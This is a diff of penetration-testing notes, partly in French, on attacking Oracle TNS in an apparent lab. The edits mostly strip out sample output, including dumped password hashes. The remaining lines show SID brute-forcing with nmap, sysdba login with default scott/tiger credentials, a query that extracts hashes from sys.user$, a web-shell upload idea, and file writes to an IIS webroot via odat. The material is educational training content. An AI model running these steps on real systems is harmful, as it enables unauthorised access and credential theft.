@@ -136,7 +136,9 @@ LISTENER =
         * **HOST** : Le nom d'hôte ou l'adresse IP où le listener est en cours d'exécution (ici, `orcl.inlanefreight.htb`).
         * **PORT** : Le port sur lequel le listener est en écoute (ici, le port `1521`).
 
-#### En résumé :
+
+
+En résumé :
 
 * **`tnsnames.ora`** : Configure les connexions du côté client en définissant les alias de connexion et les adresses réseau associées.
 * **`listener.ora`** : Configure le listener du côté serveur, définissant les bases de données qu'il gère et les adresses réseau où il écoute les requêtes des clients.
@@ -242,29 +244,9 @@ sudo nmap -p1521 --script oracle-sid-brute <IP>
 ```shell-session
 SQL> select table_name from all_tables;
 
-TABLE_NAME
-------------------------------
-DUAL
-SYSTEM_PRIVILEGE_MAP
-TABLE_PRIVILEGE_MAP
-STMT_AUDIT_OPTION_MAP
-AUDIT_ACTIONS
-WRR$_REPLAY_CALL_FILTER
-HS_BULKLOAD_VIEW_OBJ
-HS$_PARALLEL_METADATA
-HS_PARTITION_COL_NAME
-HS_PARTITION_COL_TYPE
-HELP
-
-...SNIP...
 
 
 SQL> select * from user_role_privs;
-
-USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------- ------------------------------ --- --- ---
-SCOTT                          CONNECT                        NO  YES NO
-SCOTT                          RESOURCE                       NO  YES NO
 ```
 
 Here, the user `scott` has no administrative privileges. However, we can try using this account to log in as the System Database Admin (`sysdba`), giving us higher privileges. This is possible when the user `scott` has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.
@@ -277,37 +259,11 @@ Here, the user `scott` has no administrative privileges. However, we can try usi
 ```shell-session
 mrroboteLiot@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
 
-SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
-Version 21.4.0.0.0
 
-Copyright (c) 1982, 2021, Oracle. All rights reserved.
-
-
-Connected to:
-Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
 
 
 SQL> select * from user_role_privs;
 
-USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------- ------------------------------ --- --- ---
-SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
-SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
-SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
-SYS                            AQ_USER_ROLE                   YES YES NO
-SYS                            AUTHENTICATEDUSER              YES YES NO
-SYS                            CONNECT                        YES YES NO
-SYS                            CTXAPP                         YES YES NO
-SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
-SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
-SYS                            DBA                            YES YES NO
-SYS                            DBFS_ROLE                      YES YES NO
-
-USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------- ------------------------------ --- --- ---
-SYS                            DELETE_CATALOG_ROLE            YES YES NO
-SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
-...SNIP...
 ```
 {% endcode %}
 
@@ -318,27 +274,7 @@ We can follow many approaches once we get access to an Oracle database. It highl
 ## <mark style="color:red;">**Oracle RDBMS - Extract Password Hashes**</mark>
 
 <pre class="language-shell-session"><code class="lang-shell-session"><strong>SQL> select name, password from sys.user$;
-</strong>
-NAME                           PASSWORD
------------------------------- ------------------------------
-SYS                            FBA343E7D6C8BC9D
-PUBLIC
-CONNECT
-RESOURCE
-DBA
-SYSTEM                         B5073FE1DE351687
-SELECT_CATALOG_ROLE
-EXECUTE_CATALOG_ROLE
-DELETE_CATALOG_ROLE
-OUTLN                          4A3BA55E08595C81
-EXP_FULL_DATABASE
-
-NAME                           PASSWORD
------------------------------- ------------------------------
-IMP_FULL_DATABASE
-LOGSTDBY_ADMINISTRATOR
-...SNIP...
-</code></pre>
+</strong></code></pre>
 
 Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:
 
@@ -353,13 +289,10 @@ First, trying our exploitation approach with files that do not look dangerous fo
 
 ## <mark style="color:red;">**Oracle RDBMS - File Upload**</mark>
 
-{% code title="" overflow="wrap" %}
+{% code title="" overflow="wrap" fullWidth="true" %}
 ```bash
 mrroboteLiot@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
 mrroboteLiot@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
-
-[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
-[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
 ```
 {% endcode %}
 
